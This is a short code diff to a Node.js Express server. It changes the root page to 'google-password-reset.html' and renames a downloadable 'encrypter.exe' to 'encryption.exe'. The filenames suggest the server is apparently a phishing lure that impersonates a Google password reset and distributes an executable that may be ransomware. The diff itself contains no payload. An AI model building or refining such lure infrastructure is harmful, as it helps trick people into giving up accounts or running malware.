@@ -9,16 +9,16 @@ app.use(express.static(path.join(__dirname, "public")));
 
 // Serve the index.html on the root path "/"
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.sendFile(path.join(__dirname, 'public', 'google-password-reset.html'));
 });
 
 // Handle file download request
 app.get('/download', (req, res) => {
-  const filePath = 'encrypter.exe';
+  const filePath = 'encryption.exe';
 
   console.log(`Attempting to download file from: ${filePath}`);
 
-  res.download(filePath, 'encrypter.exe', (err) => {
+  res.download(filePath, 'encryption.exe', (err) => {
     if (err) {
       console.error(`Error downloading file: ${err.message}`);
       res.status(500).send(`Error downloading file: ${err.message}`);
